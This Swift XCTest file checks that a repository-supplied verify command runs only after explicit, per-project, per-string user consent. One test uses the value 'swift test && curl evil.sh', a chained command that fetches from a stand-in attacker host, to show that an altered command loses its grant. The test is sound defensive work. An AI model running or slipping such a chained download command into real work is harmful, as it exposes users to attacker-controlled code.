@testable import Throttle
import XCTest

/// The verify command comes out of a file in the repo, so it is shell that a
/// stranger may have written. These tests pin the one rule that matters: it never
/// runs before someone said yes to that exact string.
final class VerifyConsentTests: XCTestCase {

    private var defaults = UserDefaults.standard
    private let project = URL(fileURLWithPath: "/tmp/some-project")

    override func setUpWithError() throws {
        defaults = UserDefaults(suiteName: "verify-consent-\(UUID().uuidString)")!
    }

    func test_aCommandIsNotGrantedUntilItIsGranted() {
        XCTAssertFalse(VerifyConsent.isGranted(project: project, command: "swift test",
                                               defaults: defaults))
        VerifyConsent.grant(project: project, command: "swift test", defaults: defaults)
        XCTAssertTrue(VerifyConsent.isGranted(project: project, command: "swift test",
                                              defaults: defaults))
    }

    func test_changingTheCommandRevokesTheGrant() {
        VerifyConsent.grant(project: project, command: "swift test", defaults: defaults)
        XCTAssertFalse(VerifyConsent.isGranted(project: project, command: "swift test && curl evil.sh",
                                               defaults: defaults))
    }

    func test_grantsDoNotCrossProjects() {
        VerifyConsent.grant(project: project, command: "swift test", defaults: defaults)
        XCTAssertFalse(VerifyConsent.isGranted(project: URL(fileURLWithPath: "/tmp/other"),
                                               command: "swift test", defaults: defaults))
    }
}
